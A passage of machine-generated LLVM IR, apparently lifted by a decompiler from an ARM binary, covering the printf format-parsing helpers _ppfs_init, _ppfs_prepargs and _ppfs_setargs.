  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_104c8, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_10468, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_10434, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_10998 = load i32, i32* @r4, align 4
  store i32 %v3_10998, i32* %stack_var_-12, align 4
  %v6_10998 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_109a4 = load i32, i32* @r1, align 4
  store i32 %v0_109a4, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_109ac = bitcast i32* %arg1 to i8*
  %v3_109ac = call i32 @__GI_memset(i8* %v2_109ac, i32 0)
  %v0_109b0 = load i32, i32* @r4, align 4
  %v1_109b0 = add i32 %v0_109b0, 24
  %v2_109b0 = inttoptr i32 %v1_109b0 to i32*
  %v3_109b0 = load i32, i32* %v2_109b0, align 4
  %v1_109b4 = add i32 %v3_109b0, -1
  store i32 %v1_109b4, i32* %v2_109b0, align 4
  %v0_109bc = load i32, i32* @r5, align 4
  %v1_109bc = load i32, i32* @r4, align 4
  %v2_109bc = inttoptr i32 %v1_109bc to i32*
  store i32 %v0_109bc, i32* %v2_109bc, align 4
  %v0_109c0 = load i32, i32* @r4, align 4
  %v1_109c0 = add i32 %v0_109c0, 40
  store i32 %v1_109c0, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_109d019 = inttoptr i32 %v1_109c0 to i32*
  store i32 8, i32* %v2_109d019, align 4
  %v3_109d020 = load i32, i32* %r1.global-to-local, align 4
  %v4_109d021 = add i32 %v3_109d020, 4
  store i32 %v4_109d021, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_109c8.dec_label_pc_109c8_crit_edge

dec_label_pc_109c8.dec_label_pc_109c8_crit_edge:  ; preds = %entry, %dec_label_pc_109c8.dec_label_pc_109c8_crit_edge
  %v4_109d022 = phi i32 [ %v4_109d021, %entry ], [ %v4_109d0, %dec_label_pc_109c8.dec_label_pc_109c8_crit_edge ]
  %v0_109cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_109cc = add i32 %v0_109cc.pre, -1
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v7_109cc = icmp eq i32 %v0_109cc.pre, 1
  %v2_109d0 = inttoptr i32 %v4_109d022 to i32*
  store i32 8, i32* %v2_109d0, align 4
  %v3_109d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_109d0 = add i32 %v3_109d0, 4
  store i32 %v4_109d0, i32* %r1.global-to-local, align 4
  br i1 %v7_109cc, label %dec_label_pc_109d8, label %dec_label_pc_109c8.dec_label_pc_109c8_crit_edge

dec_label_pc_109d8:                               ; preds = %dec_label_pc_109c8.dec_label_pc_109c8_crit_edge
  %v0_109d8 = load i32, i32* @r5, align 4
  store i32 %v0_109d8, i32* %r2.global-to-local, align 4
  %v1_10a1c3 = inttoptr i32 %v0_109d8 to i8*
  %v2_10a1c4 = load i8, i8* %v1_10a1c3, align 1
  %v2_10a206 = icmp eq i8 %v2_10a1c4, 0
  br i1 %v2_10a206, label %dec_label_pc_10a28, label %dec_label_pc_109e8

dec_label_pc_109e0:                               ; preds = %dec_label_pc_10a00
  %v2_109e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_109e4, i32* @r4, align 4
  store i32 %v6_10998, i32* @r5, align 4
  ret i32 -1

dec_label_pc_109e8:                               ; preds = %dec_label_pc_109d8, %dec_label_pc_10a1c.backedge
  %v0_109f0 = phi i32 [ %storemerge, %dec_label_pc_10a1c.backedge ], [ %v0_109d8, %dec_label_pc_109d8 ]
  %v2_10a1c7 = phi i8 [ %v2_10a1c, %dec_label_pc_10a1c.backedge ], [ %v2_10a1c4, %dec_label_pc_109d8 ]
  %v7_109e8 = icmp eq i8 %v2_10a1c7, 37
  br i1 %v7_109e8, label %dec_label_pc_109f0, label %dec_label_pc_10a18

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109e8
  %v1_109f0 = add i32 %v0_109f0, 1
  %v2_109f0 = inttoptr i32 %v1_109f0 to i8*
  %v3_109f0 = load i8, i8* %v2_109f0, align 1
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v7_109f4 = icmp eq i8 %v3_109f0, 37
  br i1 %v7_109f4, label %dec_label_pc_10a18, label %dec_label_pc_10a00

dec_label_pc_10a00:                               ; preds = %dec_label_pc_109f0
  %v0_109f8 = load i32, i32* @r4, align 4
  %v2_10a00 = inttoptr i32 %v0_109f8 to i32*
  store i32 %v1_109f0, i32* %v2_10a00, align 4
  %v2_10a04 = call i32 @_ppfs_parsespec(i32* %v2_10a00)
  %v1_10a08 = icmp slt i32 %v2_10a04, 0
  br i1 %v1_10a08, label %dec_label_pc_109e0, label %dec_label_pc_10a10

dec_label_pc_10a10:                               ; preds = %dec_label_pc_10a00
  %v0_10a10 = load i32, i32* @r4, align 4
  %v1_10a10 = inttoptr i32 %v0_10a10 to i32*
  %v2_10a10 = load i32, i32* %v1_10a10, align 4
  br label %dec_label_pc_10a1c.backedge

dec_label_pc_10a18:                               ; preds = %dec_label_pc_109e8, %dec_label_pc_109f0
  %v0_10a18 = phi i32 [ %v0_109f0, %dec_label_pc_109e8 ], [ %v1_109f0, %dec_label_pc_109f0 ]
  %v1_10a18 = add i32 %v0_10a18, 1
  br label %dec_label_pc_10a1c.backedge

dec_label_pc_10a1c.backedge:                      ; preds = %dec_label_pc_10a18, %dec_label_pc_10a10
  %storemerge = phi i32 [ %v1_10a18, %dec_label_pc_10a18 ], [ %v2_10a10, %dec_label_pc_10a10 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_10a1c = inttoptr i32 %storemerge to i8*
  %v2_10a1c = load i8, i8* %v1_10a1c, align 1
  %v2_10a20 = icmp eq i8 %v2_10a1c, 0
  br i1 %v2_10a20, label %dec_label_pc_10a1c.dec_label_pc_10a28_crit_edge, label %dec_label_pc_109e8

dec_label_pc_10a1c.dec_label_pc_10a28_crit_edge:  ; preds = %dec_label_pc_10a1c.backedge
  %v0_10a28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10a28

dec_label_pc_10a28:                               ; preds = %dec_label_pc_10a1c.dec_label_pc_10a28_crit_edge, %dec_label_pc_109d8
  %v0_10a28 = phi i32 [ %v0_10a28.pre, %dec_label_pc_10a1c.dec_label_pc_10a28_crit_edge ], [ %v0_109d8, %dec_label_pc_109d8 ]
  %v3_10a1c.lcssa.in = phi i8 [ %v2_10a1c, %dec_label_pc_10a1c.dec_label_pc_10a28_crit_edge ], [ %v2_10a1c4, %dec_label_pc_109d8 ]
  %v3_10a1c.lcssa = zext i8 %v3_10a1c.lcssa.in to i32
  %v1_10a28 = load i32, i32* @r4, align 4
  %v2_10a28 = inttoptr i32 %v1_10a28 to i32*
  store i32 %v0_10a28, i32* %v2_10a28, align 4
  %v2_10a2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10a2c, i32* @r4, align 4
  store i32 %v6_10998, i32* @r5, align 4
  ret i32 %v3_10a1c.lcssa

; uselistorder directives
  uselistorder i8 %v2_10a1c, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_109d8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_109d0, { 1, 0 }
  uselistorder i32 %v0_109cc.pre, { 1, 0 }
  uselistorder i32 %v6_10998, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_10a18, { 1, 0 }
  uselistorder label %dec_label_pc_109e8, { 1, 0 }
  uselistorder label %dec_label_pc_109c8.dec_label_pc_109c8_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10a30 = load i32, i32* @r4, align 4
  store i32 %v3_10a30, i32* %stack_var_-12, align 4
  %v1_10a34 = add i32 %arg1, 24
  %v2_10a34 = inttoptr i32 %v1_10a34 to i32*
  %v3_10a34 = load i32, i32* %v2_10a34, align 4
  store i32 %v3_10a34, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_10a44 = add i32 %arg1, 76
  %v3_10a44 = inttoptr i32 %v2_10a44 to i32*
  store i32 %arg2, i32* %v3_10a44, align 4
  %v7_10a48 = icmp sgt i32 %v3_10a34, 0
  br i1 %v7_10a48, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_10a48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_10a48, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_10a4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10a4c = add i32 %arg1, 8
  %v3_10a4c = inttoptr i32 %v2_10a4c to i32*
  store i32 %v0_10a4c, i32* %v3_10a4c, align 4
  %v0_10a50 = load i32, i32* %r5.global-to-local, align 4
  %v2_10a50 = add i32 %arg1, 28
  %v3_10a50 = inttoptr i32 %v2_10a50 to i32*
  store i32 %v0_10a50, i32* %v3_10a50, align 4
  %v0_10a54 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10a54, i32* %v2_10a34, align 4
  %v0_10a58 = load i32, i32* %r3.global-to-local, align 4
  %v2_10a58 = add i32 %arg1, 4
  %v3_10a58 = inttoptr i32 %v2_10a58 to i32*
  store i32 %v0_10a58, i32* %v3_10a58, align 4
  %v0_10a5c = call i32 @_ppfs_setargs()
  %v0_10a60 = load i32, i32* %r5.global-to-local, align 4
  %v1_10a60 = load i32, i32* @r4, align 4
  %v2_10a60 = add i32 %v1_10a60, 24
  %v3_10a60 = inttoptr i32 %v2_10a60 to i32*
  store i32 %v0_10a60, i32* %v3_10a60, align 4
  %v2_10a64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10a64, i32* @r4, align 4
  ret i32 %v0_10a5c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 6, 4, 2, 1, 5, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10a68 = load i32, i32* @r0, align 4
  %v1_10a68 = add i32 %v0_10a68, 24
  %v2_10a68 = inttoptr i32 %v1_10a68 to i32*
  %v3_10a68 = load i32, i32* %v2_10a68, align 4
  store i32 %v3_10a68, i32* %r1.global-to-local, align 4
  %v2_10a6c = icmp eq i32 %v3_10a68, 0
  %v3_10a70 = load i32, i32* @r4, align 4
  store i32 %v3_10a70, i32* %stack_var_-8, align 4
  %v1_10a74 = add i32 %v0_10a68, 80
  store i32 %v1_10a74, i32* %ip.global-to-local, align 4
  %v1_10a78 = add i32 %v0_10a68, 8
  %v2_10a78 = inttoptr i32 %v1_10a78 to i32*
  %v3_10a78 = load i32, i32* %v2_10a78, align 4
  store i32 %v3_10a78, i32* %r3.global-to-local, align 4
  %v6_10a80 = icmp eq i32 %v3_10a78, -2147483648
  br i1 %v2_10a6c, label %dec_label_pc_10a80, label %dec_label_pc_10ba4

dec_label_pc_10a80:                               ; preds = %entry
  br i1 %v6_10a80, label %dec_label_pc_10a88, label %dec_label_pc_10aa0

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10a80
  %v1_10a88 = add i32 %v0_10a68, 76
  %v2_10a88 = inttoptr i32 %v1_10a88 to i32*
  %v3_10a88 = load i32, i32* %v2_10a88, align 4
  store i32 %v3_10a88, i32* %r3.global-to-local, align 4
  %v1_10a8c = inttoptr i32 %v3_10a88 to i32*
  %v2_10a8c = load i32, i32* %v1_10a8c, align 4
  store i32 %v2_10a8c, i32* %r2.global-to-local, align 4
  %v1_10a90 = add i32 %v3_10a88, 4
  store i32 %v1_10a90, i32* %r3.global-to-local, align 4
  store i32 %v1_10a90, i32* %v2_10a88, align 4
  %v0_10a98 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a98 = load i32, i32* @r0, align 4
  %v2_10a98 = add i32 %v1_10a98, 8
  %v3_10a98 = inttoptr i32 %v2_10a98 to i32*
  store i32 %v0_10a98, i32* %v3_10a98, align 4
  %v0_10a9c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a9c = load i32, i32* @r0, align 4
  %v2_10a9c = add i32 %v1_10a9c, 80
  %v3_10a9c = inttoptr i32 %v2_10a9c to i32*
  store i32 %v0_10a9c, i32* %v3_10a9c, align 4
  %v0_10aa0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10aa0

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10a80, %dec_label_pc_10a88
  %v1_10ab8 = phi i32 [ %v0_10a68, %dec_label_pc_10a80 ], [ %v0_10aa0.pre, %dec_label_pc_10a88 ]
  %v1_10aa0 = add i32 %v1_10ab8, 4
  %v2_10aa0 = inttoptr i32 %v1_10aa0 to i32*
  %v3_10aa0 = load i32, i32* %v2_10aa0, align 4
  store i32 %v3_10aa0, i32* %r3.global-to-local, align 4
  %v6_10aa4 = icmp eq i32 %v3_10aa0, -2147483648
  br i1 %v6_10aa4, label %dec_label_pc_10aac, label %dec_label_pc_10ac4

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10aa0
  %v1_10aac = add i32 %v1_10ab8, 76
  %v2_10aac = inttoptr i32 %v1_10aac to i32*
  %v3_10aac = load i32, i32* %v2_10aac, align 4
  store i32 %v3_10aac, i32* %r3.global-to-local, align 4
  %v1_10ab0 = inttoptr i32 %v3_10aac to i32*
  %v2_10ab0 = load i32, i32* %v1_10ab0, align 4
  store i32 %v2_10ab0, i32* %r2.global-to-local, align 4
  %v1_10ab4 = add i32 %v3_10aac, 4
  store i32 %v1_10ab4, i32* %r3.global-to-local, align 4
  store i32 %v1_10ab4, i32* %v2_10aac, align 4
  %v0_10abc = load i32, i32* %r2.global-to-local, align 4
  %v1_10abc = load i32, i32* @r0, align 4
  %v2_10abc = add i32 %v1_10abc, 4
  %v3_10abc = inttoptr i32 %v2_10abc to i32*
  store i32 %v0_10abc, i32* %v3_10abc, align 4
  %v0_10ac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ac0 = load i32, i32* @r0, align 4
  %v2_10ac0 = add i32 %v1_10ac0, 80
  %v3_10ac0 = inttoptr i32 %v2_10ac0 to i32*
  store i32 %v0_10ac0, i32* %v3_10ac0, align 4
  %v0_10b9418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10ac4

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10aa0, %dec_label_pc_10aac
  %v0_10b9418 = phi i32 [ %v1_10ab8, %dec_label_pc_10aa0 ], [ %v0_10b9418.pre, %dec_label_pc_10aac ]
  %v0_10ac4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10ac4, i32* %lr.global-to-local, align 4
  %v1_10b9419 = add i32 %v0_10b9418, 28
  %v2_10b9420 = inttoptr i32 %v1_10b9419 to i32*
  %v3_10b9421 = load i32, i32* %v2_10b9420, align 4
  store i32 %v3_10b9421, i32* %r3.global-to-local, align 4
  %v5_10b9c23 = icmp slt i32 %v0_10ac4, %v3_10b9421
  br i1 %v5_10b9c23, label %dec_label_pc_10acc, label %dec_label_pc_10ba0.loopexit

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10ac4, %dec_label_pc_10b90
  %v0_10b9425 = phi i32 [ %v0_10b94, %dec_label_pc_10b90 ], [ %v0_10b9418, %dec_label_pc_10ac4 ]
  %v1_10acc24 = phi i32 [ %v1_10b90, %dec_label_pc_10b90 ], [ %v0_10ac4, %dec_label_pc_10ac4 ]
  %v4_10acc = mul i32 %v1_10acc24, 4
  %v5_10acc = add i32 %v0_10b9425, %v4_10acc
  store i32 %v5_10acc, i32* %r3.global-to-local, align 4
  %v1_10ad0 = add i32 %v5_10acc, 40
  %v2_10ad0 = inttoptr i32 %v1_10ad0 to i32*
  %v3_10ad0 = load i32, i32* %v2_10ad0, align 4
  store i32 %v3_10ad0, i32* %r2.global-to-local, align 4
  %v7_10ad4 = icmp eq i32 %v3_10ad0, 8
  br i1 %v7_10ad4, label %dec_label_pc_10b90, label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10acc
  %v1_10adc = add i32 %v0_10b9425, 76
  %v2_10adc = inttoptr i32 %v1_10adc to i32*
  %v3_10adc = load i32, i32* %v2_10adc, align 4
  store i32 %v3_10adc, i32* %r1.global-to-local, align 4
  %v8_10ae0 = icmp sgt i32 %v3_10ad0, 8
  br i1 %v8_10ae0, label %dec_label_pc_10b04, label %dec_label_pc_10ae4

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10adc
  %v7_10ae4 = icmp eq i32 %v3_10ad0, 2
  br i1 %v7_10ae4, label %dec_label_pc_10b50, label %dec_label_pc_10aec

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10ae4
  %v8_10aec = icmp sgt i32 %v3_10ad0, 2
  br i1 %v8_10aec, label %dec_label_pc_10afc, label %dec_label_pc_10af0

dec_label_pc_10af0:                               ; preds = %dec_label_pc_10aec
  %v1_10af0 = icmp slt i32 %v3_10ad0, 0
  br i1 %v1_10af0, label %dec_label_pc_10b7c, label %dec_label_pc_10b50

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10aec
  %v7_10afc = icmp eq i32 %v3_10ad0, 7
  br i1 %v7_10afc, label %dec_label_pc_10b64, label %dec_label_pc_10b7c

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10adc
  %v7_10b04 = icmp eq i32 %v3_10ad0, 1024
  br i1 %v7_10b04, label %dec_label_pc_10b50, label %dec_label_pc_10b0c

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_10b04
  %v8_10b0c = icmp sgt i32 %v3_10ad0, 1024
  br i1 %v8_10b0c, label %dec_label_pc_10b24, label %dec_label_pc_10b10

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10b0c
  switch i32 %v3_10ad0, label %dec_label_pc_10b7c [
    i32 256, label %dec_label_pc_10b50
    i32 512, label %dec_label_pc_10b50
  ]

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b0c
  %v7_10b24 = icmp eq i32 %v3_10ad0, 2048
  br i1 %v7_10b24, label %dec_label_pc_10b3c, label %dec_label_pc_10b34

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b24
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_10b30 = icmp eq i32 %v3_10ad0, 2055
  br i1 %v9_10b30, label %dec_label_pc_10b64, label %dec_label_pc_10b7c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b24
  %v1_10b3c = add i32 %v3_10adc, 8
  store i32 %v1_10b3c, i32* %r3.global-to-local, align 4
  store i32 %v1_10b3c, i32* %v2_10adc, align 4
  %v0_10b44 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b44 = inttoptr i32 %v0_10b44 to i32*
  %v2_10b44 = load i32, i32* %v1_10b44, align 4
  store i32 %v2_10b44, i32* %r3.global-to-local, align 4
  %v3_10b44 = add i32 %v0_10b44, 4
  %v4_10b44 = inttoptr i32 %v3_10b44 to i32*
  %v5_10b44 = load i32, i32* %v4_10b44, align 4
  store i32 %v5_10b44, i32* %r4.global-to-local, align 4
  %v0_10b48 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b48 = inttoptr i32 %v0_10b48 to i32*
  store i32 %v2_10b44, i32* %v1_10b48, align 4
  %v3_10b48 = add i32 %v0_10b48, 4
  %v4_10b48 = inttoptr i32 %v3_10b48 to i32*
  %v5_10b48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10b48, i32* %v4_10b48, align 4
  br label %dec_label_pc_10b8c

dec_label_pc_10b50:                               ; preds = %dec_label_pc_10b10, %dec_label_pc_10b10, %dec_label_pc_10af0, %dec_label_pc_10b04, %dec_label_pc_10ae4
  %v1_10b50 = inttoptr i32 %v3_10adc to i32*
  %v2_10b50 = load i32, i32* %v1_10b50, align 4
  store i32 %v2_10b50, i32* %r2.global-to-local, align 4
  %v1_10b54 = add i32 %v3_10adc, 4
  store i32 %v1_10b54, i32* %r3.global-to-local, align 4
  store i32 %v1_10b54, i32* %v2_10adc, align 4
  %v0_10b5c = load i32, i32* %r2.global-to-local, align 4
  %v1_10b5c = load i32, i32* %ip.global-to-local, align 4
  %v2_10b5c = inttoptr i32 %v1_10b5c to i32*
  store i32 %v0_10b5c, i32* %v2_10b5c, align 4
  br label %dec_label_pc_10b8c

dec_label_pc_10b64:                               ; preds = %dec_label_pc_10afc, %dec_label_pc_10b34
  %v3_10b64 = load i32, i32* %v2_10adc, align 4
  store i32 %v3_10b64, i32* %r3.global-to-local, align 4
  %v1_10b68 = inttoptr i32 %v3_10b64 to i32*
  %v2_10b68 = load i32, i32* %v1_10b68, align 4
  store i32 %v2_10b68, i32* %r1.global-to-local, align 4
  %v3_10b68 = add i32 %v3_10b64, 4
  %v4_10b68 = inttoptr i32 %v3_10b68 to i32*
  %v5_10b68 = load i32, i32* %v4_10b68, align 4
  store i32 %v5_10b68, i32* %r2.global-to-local, align 4
  %v1_10b6c = add i32 %v3_10b64, 8
  store i32 %v1_10b6c, i32* %r3.global-to-local, align 4
  store i32 %v1_10b6c, i32* %v2_10adc, align 4
  %v0_10b74 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b74 = inttoptr i32 %v0_10b74 to i32*
  %v2_10b74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10b74, i32* %v1_10b74, align 4
  %v3_10b74 = add i32 %v0_10b74, 4
  %v4_10b74 = inttoptr i32 %v3_10b74 to i32*
  %v5_10b74 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10b74, i32* %v4_10b74, align 4
  br label %dec_label_pc_10b8c

dec_label_pc_10b7c:                               ; preds = %dec_label_pc_10b10, %dec_label_pc_10afc, %dec_label_pc_10af0, %dec_label_pc_10b34
  %v1_10b7c = add i32 %v3_10adc, 4
  store i32 %v1_10b7c, i32* %r3.global-to-local, align 4
  store i32 %v1_10b7c, i32* %v2_10adc, align 4
  %v0_10b84 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b84 = inttoptr i32 %v0_10b84 to i32*
  %v2_10b84 = load i32, i32* %v1_10b84, align 4
  store i32 %v2_10b84, i32* %r3.global-to-local, align 4
  %v1_10b88 = load i32, i32* %ip.global-to-local, align 4
  %v2_10b88 = inttoptr i32 %v1_10b88 to i32*
  store i32 %v2_10b84, i32* %v2_10b88, align 4
  br label %dec_label_pc_10b8c

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b64, %dec_label_pc_10b50, %dec_label_pc_10b3c, %dec_label_pc_10b7c
  %v0_10b8c = load i32, i32* %ip.global-to-local, align 4
  %v1_10b8c = add i32 %v0_10b8c, 8
  store i32 %v1_10b8c, i32* %ip.global-to-local, align 4
  %v0_10b90.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10b94.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10acc, %dec_label_pc_10b8c
  %v0_10b94 = phi i32 [ %v0_10b9425, %dec_label_pc_10acc ], [ %v0_10b94.pre, %dec_label_pc_10b8c ]
  %v0_10b90 = phi i32 [ %v1_10acc24, %dec_label_pc_10acc ], [ %v0_10b90.pre, %dec_label_pc_10b8c ]
  %v1_10b90 = add i32 %v0_10b90, 1
  store i32 %v1_10b90, i32* %lr.global-to-local, align 4
  %v1_10b94 = add i32 %v0_10b94, 28
  %v2_10b94 = inttoptr i32 %v1_10b94 to i32*
  %v3_10b94 = load i32, i32* %v2_10b94, align 4
  store i32 %v3_10b94, i32* %r3.global-to-local, align 4
  %v5_10b9c = icmp slt i32 %v1_10b90, %v3_10b94
  br i1 %v5_10b9c, label %dec_label_pc_10acc, label %dec_label_pc_10b94.dec_label_pc_10ba0.loopexit_crit_edge

dec_label_pc_10ba4:                               ; preds = %entry
  br i1 %v6_10a80, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10ba4
  %v2_10ba8 = add i32 %v0_10a68, 36
  %v3_10ba8 = inttoptr i32 %v2_10ba8 to i8*
  %v4_10ba8 = load i8, i8* %v3_10ba8, align 1
  %v5_10ba8 = zext i8 %v4_10ba8 to i32
  %v5_10bac = mul nuw nsw i32 %v5_10ba8, 8
  %v6_10bac = add i32 %v5_10bac, %v1_10a74
  store i32 %v6_10bac, i32* %r3.global-to-local, align 4
  %v2_10bb0 = add i32 %v6_10bac, -8
  %v3_10bb0 = inttoptr i32 %v2_10bb0 to i32*
  %v4_10bb0 = load i32, i32* %v3_10bb0, align 4
  store i32 %v4_10bb0, i32* %r3.global-to-local, align 4
  store i32 %v4_10bb0, i32* %v2_10a78, align 4
  %v0_10bb8.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10ba4, %bb
  %v2_10bcc = phi i32 [ %v0_10bb8.pre, %bb ], [ %v0_10a68, %dec_label_pc_10ba4 ]
  %v1_10bb8 = add i32 %v2_10bcc, 4
  %v2_10bb8 = inttoptr i32 %v1_10bb8 to i32*
  %v3_10bb8 = load i32, i32* %v2_10bb8, align 4
  store i32 %v3_10bb8, i32* %r3.global-to-local, align 4
  %v6_10bbc = icmp eq i32 %v3_10bb8, -2147483648
  br i1 %v6_10bbc, label %bb15, label %dec_label_pc_10ba0

bb15:                                             ; preds = %.thread2
  %v2_10bc0 = add i32 %v2_10bcc, 37
  %v3_10bc0 = inttoptr i32 %v2_10bc0 to i8*
  %v4_10bc0 = load i8, i8* %v3_10bc0, align 1
  %v5_10bc0 = zext i8 %v4_10bc0 to i32
  %v1_10bc4 = load i32, i32* %ip.global-to-local, align 4
  %v5_10bc4 = mul nuw nsw i32 %v5_10bc0, 8
  %v6_10bc4 = add i32 %v5_10bc4, %v1_10bc4
  store i32 %v6_10bc4, i32* %r3.global-to-local, align 4
  %v2_10bc8 = add i32 %v6_10bc4, -8
  %v3_10bc8 = inttoptr i32 %v2_10bc8 to i32*
  %v4_10bc8 = load i32, i32* %v3_10bc8, align 4
  store i32 %v4_10bc8, i32* %r3.global-to-local, align 4
  store i32 %v4_10bc8, i32* %v2_10bb8, align 4
  %v0_10bd0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10b94.dec_label_pc_10ba0.loopexit_crit_edge: ; preds = %dec_label_pc_10b90
  br label %dec_label_pc_10ba0.loopexit

dec_label_pc_10ba0.loopexit:                      ; preds = %dec_label_pc_10b94.dec_label_pc_10ba0.loopexit_crit_edge, %dec_label_pc_10ac4
  %v0_10b94.lcssa = phi i32 [ %v0_10b94, %dec_label_pc_10b94.dec_label_pc_10ba0.loopexit_crit_edge ], [ %v0_10b9418, %dec_label_pc_10ac4 ]
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10ba0.loopexit, %.thread2, %bb15
  %v1_10bf0 = phi i32 [ %v0_10b94.lcssa, %dec_label_pc_10ba0.loopexit ], [ %v2_10bcc, %.thread2 ], [ %v0_10bd0.pre, %bb15 ]
  %v1_10bd0 = add i32 %v1_10bf0, 8
  %v2_10bd0 = inttoptr i32 %v1_10bd0 to i32*
  %v3_10bd0 = load i32, i32* %v2_10bd0, align 4
  store i32 %v3_10bd0, i32* %r1.global-to-local, align 4
  %v1_10bd4 = icmp slt i32 %v3_10bd0, 0
  br i1 %v1_10bd4, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_10ba0
  %v5_10bd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_10bd8, i32* @r4, align 4
  ret i32 %v1_10bf0

bb17:                                             ; preds = %dec_label_pc_10ba0
  %v1_10bdc = add i32 %v1_10bf0, 16
  %v2_10bdc = inttoptr i32 %v1_10bdc to i32*
  %v3_10bdc = load i32, i32* %v2_10bdc, align 4
  %v1_10be4 = sub i32 0, %v3_10bd0
  store i32 %v1_10be4, i32* %r1.global-to-local, align 4
  %v1_10be0 = and i32 %v3_10bdc, -10
  %v1_10be8 = or i32 %v1_10be0, 8
  store i32 %v1_10be8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10bf0 = add i32 %v1_10bf0, 20
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i32*
  store i32 32, i32* %v3_10bf0, align 4
  %v0_10bf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10bf4 = load i32, i32* @r0, align 4
  %v2_10bf4 = add i32 %v1_10bf4, 8
  %v3_10bf4 = inttoptr i32 %v2_10bf4 to i32*
  store i32 %v0_10bf4, i32* %v3_10bf4, align 4
  %v0_10bf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10bf8 = load i32, i32* @r0, align 4
  %v2_10bf8 = add i32 %v1_10bf8, 16
  %v3_10bf8 = inttoptr i32 %v2_10bf8 to i32*
